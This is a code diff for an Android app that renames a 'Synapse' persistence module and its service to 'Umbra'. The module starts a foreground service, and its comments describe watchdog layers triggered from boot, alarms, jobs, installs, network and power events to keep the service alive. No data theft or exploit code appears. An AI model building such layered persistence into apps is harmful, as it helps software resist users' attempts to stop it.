@@ -1,4 +1,4 @@
-package org.synapse.core.persistence
+package org.umbra.core.persistence
 
 import android.app.ActivityManager
 import android.content.Context
@@ -6,15 +6,15 @@ import android.content.Intent
 import android.util.Log
 
 object PersistenceChain {
-    private const val TAG = "Synapse"
+    private const val TAG = "Umbra"
 
     /**
-     * Start the Synapse foreground service and schedule all watchdog layers.
+     * Start the Umbra foreground service and schedule all watchdog layers.
      * Called from: ContentProvider, BootReceiver, Alarm, Job, Install, Network, Power.
      */
     fun start(context: Context) {
         Log.d(TAG, "Persistence chain starting")
-        val intent = Intent(context, SynapseService::class.java)
+        val intent = Intent(context, UmbraService::class.java)
         context.startForegroundService(intent)
 
         // Schedule all watchdog layers on every start call to ensure they
@@ -23,11 +23,11 @@ object PersistenceChain {
     }
 
     /**
-     * Check if the SynapseService is currently running.
+     * Check if the UmbraService is currently running.
      */
     fun isServiceRunning(context: Context): Boolean {
         val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
-        val serviceClassName = SynapseService::class.java.name
+        val serviceClassName = UmbraService::class.java.name
         for (service in manager.getRunningServices(Int.MAX_VALUE)) {
             if (serviceClassName == service.service.className) {
                 return true
